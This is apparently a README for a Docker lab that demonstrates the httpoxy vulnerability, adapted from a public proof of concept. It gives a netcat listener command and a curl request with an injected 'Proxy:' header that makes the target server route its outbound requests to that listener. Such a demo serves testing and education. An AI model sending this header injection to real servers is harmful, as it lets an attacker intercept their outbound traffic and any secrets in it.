# httpoxy-vuln

Completely and utterly stolen from [php-fpm-httpoxy-poc](https://github.com/httpoxy/php-fpm-httpoxy-poc), however that proof of concept doesn't work out of the box and bending it to a testing end seemed all together decent.

## Steps

This is how the vulnerability works:

1. Send a header with 'Proxy: yourproxyserver:port'
2. notice a request is routed to your proxy
3. take notice in your proxy server

## Using this demo

Here is how you can see it in action:

1. rebuild and run the whole docker thing

    ```
    ./rebuild.sh
    ```

2. Start some sort of capturing proxy:

    `nc -l 12345`

4. test that the container running at 192.168.99.100, attempts to proxy out 192.168.0.6.12345...


    ```sh
    curl -H 'Proxy: 192.168.0.6:12345' 192.168.99.100
    ```



